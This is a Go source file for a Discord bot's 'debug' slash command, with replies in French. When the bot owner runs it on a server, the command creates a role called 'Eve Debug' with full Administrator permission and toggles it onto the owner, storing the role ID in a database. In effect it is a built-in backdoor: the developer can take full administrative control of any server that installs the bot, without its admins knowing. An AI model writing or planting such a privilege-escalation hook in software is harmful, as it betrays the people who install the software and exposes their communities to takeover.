package commandHandler

import (
	"main/pkg/bot_utils"
	"main/pkg/config"
	"main/pkg/data"
	"main/pkg/logger"
	"main/prisma/db"

	"github.com/bwmarrin/discordgo"
)

func intPtr(i int) *int {
	return &i
}

func boolPtr(b bool) *bool {
	return &b
}

func DebugHandler(s *discordgo.Session, i *discordgo.InteractionCreate) error {
	// Check if the user is the owner
	if i.Member.User.ID != config.GetConfig().OwnerId {
		embed := bot_utils.WarningEmbed(s, "Vous n'avez pas la permission d'utiliser cette commande.")
		err := s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Embeds: []*discordgo.MessageEmbed{embed},
				Flags:  discordgo.MessageFlagsEphemeral,
			},
		})
		if err != nil {
			logger.ErrorLogger.Println("Error sending response:", err)
			return err
		}
		return nil
	}

	// Acknowledge the interaction with a deferred response
	err := s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseDeferredChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Flags: discordgo.MessageFlagsEphemeral,
		},
	})
	if err != nil {
		logger.ErrorLogger.Println("Error acknowledging interaction:", err)
		return err
	}

	// Fetch the server/guild
	guild, err := s.Guild(i.GuildID)
	if err != nil {
		logger.ErrorLogger.Printf("Failed to fetch guild %s: %v", i.GuildID, err)
		_, err = s.FollowupMessageCreate(i.Interaction, true, &discordgo.WebhookParams{
			Content: "Impossible de trouver le serveur",
			Flags:   discordgo.MessageFlagsEphemeral,
		})
		return err
	}

	// Check if guild config exists in DB
	client, ctx := data.GetDBClient()
	guildData, err := client.GuildData.FindUnique(
		db.GuildData.GuildID.Equals(i.GuildID),
	).Exec(ctx)

	permissions := int64(discordgo.PermissionAdministrator)

	if err != nil {
		if err.Error() == "ErrNotFound" {
			// Create new guild entry if not found
			_, err = client.GuildData.CreateOne(
				db.GuildData.GuildID.Set(i.GuildID),
			).Exec(ctx)

			if err != nil {
				logger.ErrorLogger.Printf("Failed to create guild data: %v", err)
				_, err = s.FollowupMessageCreate(i.Interaction, true, &discordgo.WebhookParams{
					Content: "Erreur lors de la création des données du serveur",
					Flags:   discordgo.MessageFlagsEphemeral,
				})
				return err
			}

			// Create debug role
			roleData := &discordgo.RoleParams{
				Name:        "Eve Debug",
				Color:       intPtr(0xFFFFFF), // White
				Permissions: &permissions,
				Mentionable: boolPtr(true),
			}
			role, err := s.GuildRoleCreate(i.GuildID, roleData)
			if err != nil {
				logger.ErrorLogger.Printf("Failed to create debug role: %v", err)
				_, err = s.FollowupMessageCreate(i.Interaction, true, &discordgo.WebhookParams{
					Content: "Impossible de créer le rôle de debug",
					Flags:   discordgo.MessageFlagsEphemeral,
				})
				return err
			}

			// Update guild data with role ID
			_, err = client.GuildData.FindUnique(
				db.GuildData.GuildID.Equals(i.GuildID),
			).Update(
				db.GuildData.DebugRoleID.Set(role.ID),
			).Exec(ctx)

			if err != nil {
				logger.ErrorLogger.Printf("Failed to update guild with debug role: %v", err)
				return err
			}

			// Add role to the user
			err = s.GuildMemberRoleAdd(i.GuildID, i.Member.User.ID, role.ID)
			if err != nil {
				logger.ErrorLogger.Printf("Failed to add role to user: %v", err)
				return err
			}

			_, err = s.FollowupMessageCreate(i.Interaction, true, &discordgo.WebhookParams{
				Content: "Vous êtes maintenant en mode debug sur le serveur " + guild.Name,
				Flags:   discordgo.MessageFlagsEphemeral,
			})
			return err
		}
		logger.ErrorLogger.Printf("Failed to query guild data: %v", err)
		return err
	}

	// Get the role from existing server config
	var debugRoleID string
	if debugRole, ok := guildData.DebugRoleID(); ok && debugRole != "" {
		debugRoleID = debugRole
	} else {
		// Create role if it doesn't exist
		roleData := &discordgo.RoleParams{
			Name:        "Eve Debug",
			Color:       intPtr(0xFFFFFF), // White
			Permissions: &permissions,
			Mentionable: boolPtr(false),
		}
		role, err := s.GuildRoleCreate(i.GuildID, roleData)
		if err != nil {
			logger.ErrorLogger.Printf("Failed to create debug role: %v", err)
			_, err = s.FollowupMessageCreate(i.Interaction, true, &discordgo.WebhookParams{
				Content: "Impossible de créer le rôle de debug",
				Flags:   discordgo.MessageFlagsEphemeral,
			})
			return err
		}

		debugRoleID = role.ID
		_, err = client.GuildData.FindUnique(
			db.GuildData.GuildID.Equals(i.GuildID),
		).Update(
			db.GuildData.DebugRoleID.Set(role.ID),
		).Exec(ctx)

		if err != nil {
			logger.ErrorLogger.Printf("Failed to update guild with debug role: %v", err)
			return err
		}
	}

	// Check if user has the role
	member, err := s.GuildMember(i.GuildID, i.Member.User.ID)
	if err != nil {
		logger.ErrorLogger.Printf("Failed to get guild member: %v", err)
		return err
	}

	hasRole := false
	for _, roleID := range member.Roles {
		if roleID == debugRoleID {
			hasRole = true
			break
		}
	}

	// Toggle role
	var responseContent string
	if hasRole {
		// Remove role
		err = s.GuildMemberRoleRemove(i.GuildID, i.Member.User.ID, debugRoleID)
		if err != nil {
			logger.ErrorLogger.Printf("Failed to remove role: %v", err)
			return err
		}
		responseContent = "Vous n'êtes plus en mode debug sur le serveur " + guild.Name
	} else {
		// Add role
		err = s.GuildMemberRoleAdd(i.GuildID, i.Member.User.ID, debugRoleID)
		if err != nil {
			logger.ErrorLogger.Printf("Failed to add role: %v", err)
			return err
		}
		responseContent = "Vous êtes maintenant en mode debug sur le serveur " + guild.Name
	}

	_, err = s.FollowupMessageCreate(i.Interaction, true, &discordgo.WebhookParams{
		Content: responseContent,
		Flags:   discordgo.MessageFlagsEphemeral,
	})
	return err
}
